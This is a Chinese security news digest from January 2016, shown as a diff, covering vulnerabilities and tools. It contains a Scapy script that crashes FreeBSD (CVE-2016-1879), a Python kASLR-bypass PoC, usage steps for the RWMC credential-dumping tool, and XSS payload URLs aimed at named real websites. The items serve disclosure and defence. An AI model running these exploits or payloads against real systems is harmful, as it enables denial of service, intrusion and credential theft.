@@ -1,0 +1,671 @@
+-----------------------------------------------------------0-----------------------------------------------------------
+0X0: 
+     [1.29]Google Nest智能设备逆向姿势详解 
+
+如今物联网的概念十分火热，但真正的创新没有你想象中那么多。那些所谓的“智能”相机、门锁、电灯真的没什么新意。然而物联网领域的某些厂商还是很了不起的，例如Nest Lab公司，被Google收购之后已经变成了物联网领域最富盛名的品牌之一。
+Protonet公司把拥有并且能够访问个人数据当作核心价值观之一，所以虽然我们对Google的技术非常崇敬，还是对它的智能家居产品只能通过云来访问这一点非常怀疑。
+ =700) window.open('http://image.3001.net/images/20160126/14537990286721.jpg!small')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+-----------------------------------------------------------1-----------------------------------------------------------
+0X1: 
+     [1.29]RWMC：利用PowerShell提取Windows账号密码的利器 
+
+=700) window.open('http://image.3001.net/images/20160126/14538141226451.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+RWMC（Reveal Windows Memory Credentials）是一个Windows PowerShell脚本，仅仅使用它和CDB命令行选项（Windows调试器）就可以提取Windows凭证，此外可以本地提取、远程提取，还可以从dump出来的内存文件中提取，同时即使运行环境系统架构与目标系统不同，也能够正常工作。影响范围包括Windows 2003到2012、Windows 7（32位和64位）、Windows 8以及Windows 10家庭版。
+值得注意的是，该脚本不同于Mimikatz和WCE，因为它不需要利用系统dll文件来解密数据，所有的解密工作都在这个脚本中完成。
+功能清单
+RWMC的主要功能和特点包括：
+1、完全的PowerShell脚本实现2、能够在本地工作、远程工作，或者从目标机器上收集到的dump文件中提取3、不需要使用操作系统dll文件来在内存中定位凭证地址，但是需要一个简单的微软调试器4、不需要使用操作系统dll文件来破译收集的密码，破译工作完全由PowerShell脚本实现（AES、3DES、DES-X）5、它能够破译微软未归档的DES-X6、它能够工作在与目标系统不同架构的系统上7、在内存中不留痕迹工作环境范围
+它能够正常工作的系统版本包括：
+Windows 2003到2012，以及Windows 10 （在Windows 2003、2008R2、2012、2012R2以及Windows 7的32位和64位平台、Windows 8和Windows 10的家庭版都测试通过）。甚至，在另一种与目标系统不同架构的系统上也能正常工作。
+运行环境要求
+为了确保正常有效地工作，需要具备以下环境：
+1、PowerShell 32、允许在你的机器上运行PowerShell脚本，所以需要修改PowerShell执行策略，例如：Set-ExecutionPolicy Unrestricted -force3、与互联网连通使用举例
+下面，以Windows 2012R2或Windows 10系统为例，给出使用该工具的不同方法：
+（1）远程提取：
+* Launch the script* Local computer, Remote computer or from a dump file ? (local, remote, dump): remote [enter]* serverName [enter]（2）从一个dump文件中提取：如果你必须转储目标机器的本地安全认证子系统服务（LSASS）进程信息，你可以用下面的功能选项来执行脚本：
+* Launch the script * Local computer, Remote computer or from a dump file ? (local, remote, dump): dump [enter]* d:\directory_of_the_dump [enter]（3）本地提取
+* Launch the script * Local computer, Remote computer or from a dump file ? (local, remote, dump): local [enter]Github下载地址
+你可以在这里下载RWMC：点我下载。
+*参考来源：darknet、[backcolor=0px 0px]Github
+[backcolor=0px 0px]
+
+
+
+
+
+
+-----------------------------------------------------------2-----------------------------------------------------------
+0X2: 
+     [1.29]联想茄子快传（Lenovo ShareIT）被曝多处漏洞 
+
+联想ShareIT（茄子快传）服务被爆有硬编码密码、信息泄露、敏感信息没有加密、未授权漏洞，漏洞提交者为来自Core Security Consulting团队的安全研究员Ivan Huertas，这篇报告来自于同团队的Joaquín Rodríguez Varela。
+=700) window.open('http://image.3001.net/images/20160127/14538653249620.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+茄子快传是迄今为止速度最快的跨平台近场传输软件，可支持安卓/苹果/电脑/WP等设备及三十多种国家语言。其操作简单、方便，传输过程中无需流量、无需网络、无需登录账户即可互传文件，传输速度秒杀蓝牙200倍。且是一款能够实现无客户端传输文件的互传软件。茄子快传目前在全球拥有4亿+忠实用户，真正的做到了让用户在生活中随意分享快乐。
+已经被验证的存在漏洞的包括茄子快传Android 3.0.18_ww版本，还有茄子快传Windows 2.5.1.1版本，其他版本可能也受影响，但是还没有被验证。不过联想已经发布了更新版本，修复了以上两个版本的漏洞。
+1. 联想茄子快传Windows版本硬编码密码 [CVE-2016-1491]
+使用Lenovo SHAREit Windows版本接收文件时，wifi热点的密码被设置为了12345678，任何带有无线网卡的系统都可以用该密码连接上此热点，这个密码是默认的！
+2. 联想茄子快传Windows版本远程文件浏览 [CVE-2016-1490]
+当wifi热点网络被开启并且使用默认密码12345678连接上服务时，通过向茄子快传启动的WebServer服务（类http服务器）发送http请求可以达到读取文件的目的，但是文件不能被下载。以下为请求的数据包：
+POST /list?type=file&amppath=C%3A%5CUsers\admin HTTP/1.1Content-Type: application/x-www-form-urlencodedUser-Agent: Dalvik/1.6.0 (Linux U Android 4.4.4 XT1032 Build/KXB21.14-L1.40)Host: 192.168.173.1:2999Connection: Keep-AlivekAccept-Encoding: gzipContent-Length: 0HTTP/1.0 200 OKContent-Length: 2426{&quotcontainers&quot:[{&quotfilepath&quot:&quotC:\\Users\\admin\\Contacts&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Contacts&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotContacts&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Desktop&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Desktop&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotDesktop&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Documents&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Documents&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotDocuments&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Downloads&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Downloads&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotDownloads&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Favorites&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Favorites&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotFavorites&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Links&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Links&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotLinks&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Music&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Music&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotMyMusic&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Pictures&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Pictures&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotMyPictures&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\SavedGames&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\SavedGames&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotSavedGames&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Searches&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Searches&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotSearches&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Tracing&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Tracing&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotTracing&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot},{&quotfilepath&quot:&quotC:\\Users\\admin\\Videos&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin\\Videos&quot,&quotisloaded&quot:false,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotMy&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot}],&quotfilepath&quot:&quotC:\\Users\\admin&quot,&quothas_thumbnail&quot:false,&quotid&quot:&quotC:\\Users\\admin&quot,&quotisloaded&quot:true,&quotisroot&quot:false,&quotisvolume&quot:false,&quotname&quot:&quotadmin&quot,&quottype&quot:&quotfile&quot,&quotver&quot:&quot&quot}3. 茄子快传Windows和Android版本通讯过程未加密 [CVE-2016-1489]
+通过http进行文件传输时未加密，攻击者可以通过嗅探网络来查看传输的数据或者直接进行中间人攻击，比如篡改传输的内容。
+4. 在安卓设备上开启无需密码即可登录的公共wifi [CVE-2016-1492]
+当应用被设置成接收文件时，一个无需密码即可登录的公共wifi热点也会被创建，攻击者连上此wifi时可以在这些设备上抓取通讯信息。
+*原文地址：packetstormsecurity
+
+
+
+
+
+
+
+-----------------------------------------------------------3-----------------------------------------------------------
+0X3: 
+     [1.29]FreeBSD远程DoS攻击的利用分析（CVE-2016-1879） 
+
+=700) window.open('http://image.3001.net/images/20160126/14538221923678.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+FreeBSD团队宣布他们的操作系统存在严重的漏洞，黑客可以利用这个漏洞进行DoS（拒绝服务）攻击，提权或窃取系统敏感信息。SCTP ICMPv6错误处理漏洞 (CVE-2016-1879)
+SCTP (流控制传输协议)是一种传输层协议，它可以用来在IP环境中传输信号。通常，移动运营商会在技术网络中使用这个协议。
+这个漏洞影响了FreeBSD系统的数个版本（9.3、10.1、10.2），如果它们支持SCTP和IPV6就会中招（这其实是系统默认配置）。黑客利用这个漏洞，需要发送一个精心构造的ICMPv6消息。如果漏洞利用成功，就可以对系统进行DoS攻击。
+DoS攻击是由于系统对来自ICMPv6的错误消息，并没有仔细检查其中SCTP包头部的长度。如果目标接收者不存在，路由会生成一个错误信息，通过ICMPv6反馈给发送人。
+该ICMPv6包括原始的IPv6包，其中的Next Header区域会显示SCTP是如何封装的：
+=700) window.open('http://image.3001.net/images/20160126/14538221801854.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+在系统内核接收了通过ICMPv6发送来的错误消息时，它会将上层协议包传输到必要的解析器sctp6_ctlinput()里。SCTP解析器将传入的头部误认为是合法长度，然后会试图用m_copydata()将它copy，里面存有偏移值和字节数值。本来系统预计消息的头部长度是12个字节，但是黑客可能就给它发送了一个长为11字节的头部，最后空指针的引用就导致了内核崩溃。
+漏洞利用代码
+利用这个漏洞时，我们并不需要开放的SCTP套接字。神奇的Scapy会帮助我们，创建漏洞利用所需的ICMPv6数据包（这里编辑器代码排版缩进如下，有需求请自行调整）：
+#!/usr/bin/env python# -*- coding: utf-8 -*- import argparsefrom scapy.all import *def get_args():parser = argparse.ArgumentParser(description='#' * 78, epilog='#' * 78)parser.add_argument(&quot-m&quot, &quot--dst_mac&quot, type=str, help=&quotFreeBSD mac address&quot)parser.add_argument(&quot-i&quot, &quot--dst_ipv6&quot, type=str, help=&quotFreeBSD IPv6 address&quot)parser.add_argument(&quot-I&quot, &quot--iface&quot, type=str, help=&quotIface&quot)options = parser.parse_args() if options.dst_mac is None or options.dst_ipv6 is None:parser.print_help()exit() return optionsif __name__ == '__main__':options = get_args() sendp(Ether(dst=options.dst_mac) / IPv6(dst=options.dst_ipv6) / ICMPv6DestUnreach() / IPv6(nh=132, src=options.dst_ipv6, dst='fe80::230:56ff:fea6:648c'),iface=options.iface)下面是攻击演示的视频：
+
+修复和安全建议
+为了保护您的系统不受该漏洞的侵害，我们建议您这么做： 
+如果不需要IPv6，请将其禁用。在防火墙禁用ICMPv6或者IPv6流量。如果用不上的话，请禁用系统内核对SCTP堆栈的支持（需要重新编译内核）。修复漏洞，您可以使用供应商的补丁，安装对SCTP ICMPv6消息的额外校验，这里也需要重新编译内核。
+
+其他漏洞相关
+此外，FreeBSD系统还爆出了其他严重漏洞，官方开发人员为它们发布了补丁。
+1.存在这么一个漏洞，如果系统启用了TCP_MD5SIG和TCP_NOOPT，黑客通过TCP连接可以对系统进行DoS攻击。他们只需要某个TCP_NOOPT启用的监听套接字，就能利用这个漏洞（CVE-2016-1882补丁）。
+2.Linux下Robust Futex错误，会导致系统内存数据泄露（CVE-2016-1880补丁）。
+3.不安全的默认配置，导致了黑客可以访问守护进程配置文件/etc/bsnmpd.conf（CVE-2015-5677补丁）。
+为了保护您的系统不受漏洞侵害，强烈建议您在进行安全配置之后再使用IPv6地址，并安装好相应的安全工具来保护系统安全。
+*参考来源：PTsec
+
+
+
+
+
+
+
+-----------------------------------------------------------4-----------------------------------------------------------
+0X4: 
+     [1.29]利用Linux内核的信息泄露绕过kALSR防护机制 
+
+一、初步说明
+由于已经在linux内核中修复，所以没有什么顾虑谈论这个漏洞。
+
+http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328据研究人员所知，主流发行版默认不开启kALSR防护机制。研究人员希望在不久的将来kALSR防护机制会成为Linux发行版和Android设备的主流，也会变得更加健壮，因为它使得内核的漏洞利用必须在信息泄露的基础上才能实现。与此同时，其他主流操作系统，如如Windows或OSX/iOS已经采用kALSR防护机制，为什么Linux总是慢人半拍？
+总之，ASLR防护机制并不是安全的终极解决方案，正如本文接下来所讲述的，我们可以通过简单的信息泄露绕过kALSR防护机制。你可以阅读由spender撰写的另一篇文章来了解kALSR主题及其限制的一些思考。
+研究人员曾多次看到@grsecurity在Twitter上提及类似漏洞，因此极有可能其他人在我之前已经熟悉这个漏洞。但是，Linux内核社区对安全的态度并不算出色，所以信息泄露压根不受关注。
+二、正文
+
+之前该研究人员在阅读Android系统的/proc文件系统时，wchan字段引起了他的注意。
+WCHANwait channel-某个特定进程正在等待事件（event）的地址。该简称好像会出现在带有-l选项的ps命令输出。你可以从用户空间读取“/proc/进程PID/stat”来获取进程wchan值。所以wchan值会返回程序正在“等待”的代码地址。但是，这个描述是相当模糊的。如果进程处于内核地址空间中，它会为我们返回一个内核空间的地址吗？
+答案是肯定的，正如下面看到的；
+marco@marco-l:~/Documents$ cat /proc/2755/stat2755 (sleep) S 2499 2755 2499 34817 2759 1077960704 124 0 0 0 0 0 0 0 20 0 1 0 82435 11673600 170 18446744073709551615 4194304 4218740 140722592633520 140722592633144 140073761328928 0 0 0 0 18446744071579755915 0 0 17 1 0 0 0 0 0 6319632 6320692 32489472 140722592637401 140722592637415 140722592637415 140722592641005 0The value 18446744071579755915 it’s obviously a kernel code location since in hex is:&gt&gt&gt hex(18446744071579755915)'0xffffffff810de58bL'kASLR is not enabled by default on Ubuntu, at least 14.04, so we will have to add a “kaslr” to the kernel command line to enable it, you can find how to add stuff into the kernel command line on Google.启动系统之后，我们运行一下PoC：
+marco@marco-l:~/Documents$ python infoleak.py Leaking kernel pointers...leak: 0xffffffffb70de58b 18446744072485725579kASLR slide: 0x36000000三、工作原理
+这个PoC非常简单，可以说是相当粗糙，但运行速度快，使用python语言编写，因为只需要fork进程，然后读取内容。正如上面提到的，“/proc/进程pid/stat”的wchan会透露代码在内核空间的哪个地址“等待”事件，因此我们的思路是：
+
+（1）寻找某种方式让“等待”的位置固定下来（2）通过wchan泄露ALSR值（3）比较泄露值与已知的非偏移值（3）输出内核的偏移值关于（1），我们可以fork一个进程，然后让其休眠。我们可以读取该进程的&quot/proc/休眠进程pid/stat&quot，由于进程在内核地址空间处于休眠状态，其取值也是固定的。关于（2），已经讨论如何实现，whcan是stat中已知位置的字段。关于（3），我们可以通过在测试机上运行未开启kALSR防护机制的内核来获取非偏移值。四、PoC
+你需要编辑一下NON_SLID_VALUE，通过在关闭kALSR防护机制的目标内核上运行PoC获取非偏移值，例如修改成获取的十六进制数值：0xffffffffb70de58b
+
+
+import subprocessimport timeimport sysimport pprintPROC_PATH = &quot/proc/%d/stat&quotNON_SLID_VALUE = 0xffffffff810de58bdef main():sleepp = subprocess.Popen('sleep 100000'.split())time.sleep(1)child_pid = sleepp.pidcontent = Nonewith open(PROC_PATH %(child_pid), 'r') as f:content = f.read()if not content:print 'Unable to read stat from child'sys.exit(0)elements = content.split()print 'Leaking kernel pointers...'leak = int(elements[34])print 'leak: 0x%x %d' %(leak, leak)print 'kASLR slide: 0x%x' %(leak - NON_SLID_VALUE)if __name__ == '__main__':main()
+
+
+五、后记
+
+如果存在什么错误、偏差、疑问及建议，可以随时与研究人员联系（留下原作者Twitter，请翻墙联系啊）。由于系统默认情况下未启用kALSR防护机制，所目前该缺陷的危害不是很大，研究人员也未投入太多时间及精力来验证所有情况和查看内核代码。
+就随机性而言，kALSR的偏移似乎非常脆弱，研究人员尚未具体验证随机数是多少位的。但换个角度而言，在我们设备开启此防护机制总比没有好，起码这是迈向安全的开始。
+要点：
+
+Linux内核维护人员应该以更友好的态度面向安全社区。毕竟我们所有人都喜欢和使用Linux，也愿意让它变得更好。*原文地址：marcograss.github.io
+ 
+ 
+
+
+
+
+-----------------------------------------------------------5-----------------------------------------------------------
+0X5: 
+     [1.29]XSS探究：不安全的EZDATA脚本 
+
+在写这篇文章的时候，我并不清楚该脚本的作者是谁，但有很多的网站有这个漏洞。在这篇文章中，我将对&quotEZDATA&quot这个不安全的脚本进行分析。
+我是在浏览Alexa top 500网站时发现的这个脚本。
+有漏洞的JavaScript脚本如下：
+&ltscript&gt&#160&#160ezQuery(document).ready(function() {&#160&#160 //get here&#160&#160 EZDATA.trackGaEvent('Search','Request','可控点')&#160&#160})&lt/script&gt接下来在真实的案例中看下这个脚本
+（1）NFL.COM
+该网站在Alexa全球网站排名中的排名为261。如果你在该网站的搜索框中输入无害的探测字符(比如xxxxxxxx'yyyyy&lt/img)，链接如下：
+&lta href=&quothttp://search.nfl.com/search?query=\&quot xxxxxxxx'yyyyy&lt=&quot&gthttp://search.nfl.com/search?query=&quotxxxxxxxx'yyyyy&lt/img然后查看源码如下
+=700) window.open('http://image.3001.net/images/20160126/14537799019859.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+你可以看到用户的输入被单引号(‘)所包裹，而对用户提交的单引号(‘)却没有过滤和编码，还有你也可以看到&lt被过滤了，所以类似 &lt/script&gt&ltscript&gtconfirm(1)&lt/script&gt这样的攻击方式就失效了。那么我能想到的下一个payload就是
+
+'-confirm(1)-'链接如下：
+
+http://search.nfl.com/search?query='-confirm(1)-'我期待这个payload能够生效，然而并没有。原因如下图
+=700) window.open('http://image.3001.net/images/20160126/14537799507731.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+从图中可以看到括号()被过滤了，所以才导致payload失效。
+
+ECMAScript 6（http://tc39wiki.calculist.org/es6/）提供了一个叫multi-ine template string（https://developer.mozilla.org/enUS/docs/Web/JavaScript/Reference/template_strings）的属性，在这个属性的帮助下，可以构造不需要括号()的payload，用反引号“来替换括号()，所以payload变成：
+'-confirm`1`-'所以最终的链接如下：
+
+http://search.nfl.com/search?query='-confirm`1`-'结果如下
+=700) window.open('http://image.3001.net/images/20160126/14537799664566.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+（2）NBC.COM
+这个网站用的也是EZDATA这个脚本，所以链接如下：
+http://www.nbc.com/search?q='-confirm`1`-'结果如图
+
+
+
+=700) window.open('http://image.3001.net/images/20160126/14537800223081.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+（3）其他网站
+
+通过在NerdyData（https://search.nerdydata.com/code）这个网站进行搜索，链接如下：
+https://search.nerdydata.com/code/?and_code[]=//get+here+EZDATA.trackGaEvent&amplimit=0,10&amprank_min=1&amprank_max=1000001发现有61个网站使用该脚本，部分网站
+http://search.pionline.com/search?q=%27-confirm%601%60-%27http://media.kisw.com/search?q=%27-confirm%601%60-%27http://media.wben.com/search?q=%27-confirm%601%60-%27http://media.wwl.com/search?q=%27-confirm%601%60-%27http://media.989therock.com/search?q=%27-confirm%601%60-%27http://media.endonline.com/search?q=%27-confirm%601%60-%27http://media.1057fmthefan.com/search?q=%27-confirm%601%60-%27http://media.espn929.com/search?q=%27-confirm%601%60-%27http://search.msgvarsity.com/search?search=y&ampq=%27-confirm%601%60-%27http://video.ramp.com/search?q=%27-confirm`1`-%27尾记：目前这些应该都已经修复，这篇文章只是第一弹，该博客作者以分析+实例演示的方法为我们展示了XSS的很多可能出现形式，后续还会更精彩，敬请期待。
+*原文地址：[backcolor=0px 0px]respectxss
+[backcolor=0px 0px]
+
+
+
+
+
+
+
+-----------------------------------------------------------6-----------------------------------------------------------
+0X6: 
+     [1.27]Magento存在XSS漏洞，在线商城可被攻击者操控 
+
+=700) window.open('http://image.3001.net/images/20160125/14536535983435.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+Magento是一套开源的电子商务系统，是主要面向企业的应用，可处理电子商务各方面的需求，包括像购物、航运、产品评论等等，最终为建设一个多用途和适用面广的电子商务网站提供帮助。
+Magento项目小组目前已经发布补丁，修复Magento上一个高危的安全漏洞。
+漏洞信息
+这个漏洞是一个存储型XSS，是安全厂商Sucuri于2015年11月10日发现的，可实施攻击的场景为：当用户注册一个新账户时或者当用户更改当前账户的邮件地址时等涉及到邮箱账号提交的场景。
+该问题关键在于CMS（内容管理系统）如何过滤在用户侧输入的包含邮件地址信息的数据。据Sucuri的研究发现，Magento并没有有效地对邮件地址中可能存在的恶意字符进行过滤。
+这种不安全的数据过滤机制能够让攻击者在输入电子邮箱的同时附加上恶意代码。
+
+漏洞分析
+这个问题存在于Magento中的app/design/adminhtml/default/default/template/sales/order/view/info.phtml
+
+
+
+
+-----------------------------------------------------------7-----------------------------------------------------------
+0X7: 
+     [1.27]白帽子发现美军网站SQL注入漏洞，可获取敏感数据 
+
+=700) window.open('http://image.3001.net/images/20160126/14538052212092.jpg')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+去年有报道称，美军收购软件漏洞为网战准备。而美军自己的网站和服务器究竟又有多安全？一名独立安全研究者已经发现了美军网站的几个较为严重的安全漏洞。
+安全专家称，这些漏洞说明了美国防部网络安全基础的脆弱性，攻击这些军方公共站点以及职员门户要比进入五角大楼容易得多。
+美军网站惊现SQL注入漏洞
+漏洞发现者研究者名为MLT，他表示在美军国防合同管理局（DCMA）网站子域中，存在严重漏洞。攻击者可以利用该漏洞泄露国防部（DoD）雇员的个人信息，其中包括姓名、住址等。
+尽管MLT并没有对漏洞进行利用，他仍摆出了一些数据作证攻击者能够盗取敏感的个人信息。
+“在没有真正利用漏洞前，我无法对此进行确定。但是，从列表的名称和全网的官方警示来看，这些页面是不该存在SQL注入漏洞。”=700) window.open('http://image.3001.net/images/20160126/14538047549078.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
+
+
+
+-----------------------------------------------------------8-----------------------------------------------------------
+0X8: 
+     [1.26]美国FBI自建儿童色情网站钓鱼执法 查获数百人 
+
+参考消息网1月25日报道 美媒称，联邦调查局（FBI）去年曾在约两周的一段时间内运营了一家网站，是其所谓互联网最大的儿童色情网站之一，并允许用户从位于华盛顿郊区的政府网站下载数千张非法图像和视频。
+
+
+
+-----------------------------------------------------------9-----------------------------------------------------------
+0X9: 
+     [1.26]HTTP Evasions原理解析：Deflate压缩绕过防火墙 
+
+本文是HTTP Evasions系列的第二篇文章，本文主要讲支持压缩功能的浏览器或者其他设备，将有可能导致防火墙的绕过，简单来说，就是通过发送一个经过压缩的响应包来绕过防火墙。
+相关链接：第一篇《HTTP逃逸原理解析：使用HTTP 0.9进行绕过》
+ HTTP/1.1 200 ok Content-Encoding: deflate insert compressed malware hereHTTP中的压缩是什么样的
+由于压缩/解压的方式比占用高带宽传输数据的方式更加容易实现，因此压缩的方式被广泛的运用于相应包的交付。在浏览器中，内容的压缩是通过http头中的Content-Encoding字段来标识，如下：
+HTTP/1.1 200 okContent-Encoding: gzipContent-type: text/html...HTML content compressed with gzip这种压缩方式是浏览器通过请求包向服务端请求的格式，在请求包中的体现如下：
+GET / HTTP/1.0Accept-Encoding: gzip, deflate实际上，当前的浏览器提供了压缩方法“gzip”和“deflate”，这在HTTP标准中有规定。Chrome浏览器也支持“sdch”的压缩方式，Opera甚至提供“lzma”的方式。这篇文章中，我们只讨论“gzip”和“deflate”的情况。
+许多读者可能觉得’gzip’压缩有点眼熟，因为他们觉得类似用系统命令’gzip’命令来得到 *.tar.gz 文件。目前，Gizp被广泛的运用于编码wen内容，而且防火墙几乎全都支持这种方式的压缩。但是，另外一种方式编码“deflate”就不同了。
+什么是Deflate加密方式？
+Deflate与gzip非常像。甚至可以简单的说，gzip就是带有一些头部可和尾部的deflate。
+当然，在Deflate中也有其他的封装：zlib，常常被用于PNG图片的压缩。zlib格式是浏览器常用的，让人疑惑的是，这种编码方式在浏览器中被命名为‘deflate’。这样的错乱通常容易产生误解，使得大多数浏览器会同时接受zlib和deflate压缩，因为他们的名字都是deflate。
+总的来说，以下几种方式的压缩方式都会被相同的算法解压（DEFLATE）：
+n gzip � 带有头部和尾部的deflate，RFC1952：所有浏览器n deflate � 带有zlib头部和尾部的deflate算法，RFC1950：除了IE外的所有浏览器n deflate � 不带头部和尾部的原始deflate，RFC1951：所有浏览器如果防火墙无法识别Deflate算法，会发生什么？
+最理智的做法当然是隔离这些内容，因为这些可能存在危险。但是，如果真这样做了，有很多正常的数据就会被防火墙拦截掉，这显然是我们不乐意见到的。对此，当防火墙无法识别压缩方式的时候，就会直接让包通过防火墙。这种看似是用户友好型的解决方案，但实际上是大大方便了攻击者。因此，只要简单的使用deflate方式压缩，就可以让恶意软件顺利通过一些防火墙和安全系统。
+更糟糕的是，有些恶意软件可能不需要压缩。只要简单的把Content-Encoding的内容换成防火墙无法识别的压缩方式，防火墙就会停止扫描这个文件，甚至，防火墙也将不会解压这个文本：
+ HTTP/1.0 200 ok Content-Encoding: foobar ...plain uncompressed malware ...为何那些防火墙可以侦测Gzip压缩中的恶意软件，却不能侦测Deflate的？
+一个HTTP响应包是由响应头和响应体构成的。使用什么方式的压缩算法被记录在响应头里面，同时，响应体中的内容就是真正被压缩的内容。最典型的处理方法是，防火墙只把响应体的内容发送给杀毒软件进行分析。由于gzip中有一个很容易识别的头，杀毒软件可以成功的侦察出这个压缩方法并且分析被压缩的内容。
+但是Deflate压缩方式中没有像这样的特有的标识头，这种压缩出来的文本看起来更像是随机的。因此，杀毒软件无法侦察到压缩的部分是用哪种方式压缩的。这个时候，需要在把这个压缩文本发送给杀毒软件前告知杀毒软件他的压缩方式。
+为什么有些防火墙可以处理Deflate (RFC1951) 但是无法出来其他的Deflate (RFC1950) ？
+我们可以猜测防火墙的作者并没有意识到有两种Deflate方式或者他们觉得只需要处理所有浏览器都支持的方式就行了。因为没有那个正常的web开发者会使用一些所有浏览器都无法解压的压缩方式。可惜的是，攻击者并不会这么做，甚至攻击者更乐于使用这样的方式。
+我们可以事先让服务器不使用Deflate算法压缩？
+这也是一些产品的做法。他们从浏览器的请求头中的Accept-Encoding字段知道浏览器可以解压那些压缩方式的文件，而这个字段告诉服务器要用Accept-Encoding字段所说的压缩方式对内容进行压缩。但是这样的想法也是有问题的，因为，攻击者还是可以用自己可控的服务器来进行那些操作。就像这个连接中所展示的那样（链接）
+所以，防火墙不应该只把希望寄托在服务器上，不能太信任服务器，而是要检查压缩算法是否被使用。但是，所有的防火墙都只是看起来好像是假定了攻击者也要遵守这样的规则，而没有检测压缩是否真的被使用了。实际当中，ZScaler URL checker 和Comodo Web Inspector都犯了同样的错误，他们仅仅请求包中有无压缩请求，而根据盲目的相信服务器不会交付压缩的数据，详情请看。 
+可以认为使用Deflate的就是黑客行为吗？
+根据Alexa 统计的10000台服务器中，gzip是使用最多的压缩方式。但是仍然有许多服务器使用的是Deflate来压缩数据。所以不能简单的认为一个服务器使用Deflate压缩就算攻击行为了。 
+最后
+很明显，你不能过于相信供应商，所以最好自己检测下这些说自己是具有先进的威胁保护系统的供应商是否是吹牛逼。如果你想，可以下载HTTP Evader工具测试下。（链接）
+*原文地址：noxxi
+
+
+
+
+
+
+-----------------------------------------------------------10-----------------------------------------------------------
+0X10: 
+     [1.26]PowerShell利用工具：扩展你的Empire 
+
+=700) window.open('http://image.3001.net/images/20160125/14536571305846.png')" style="max-width:700pxmax-height:700px" onload="if(is_ie6&&this.offsetWidth>700)this.width=700" >
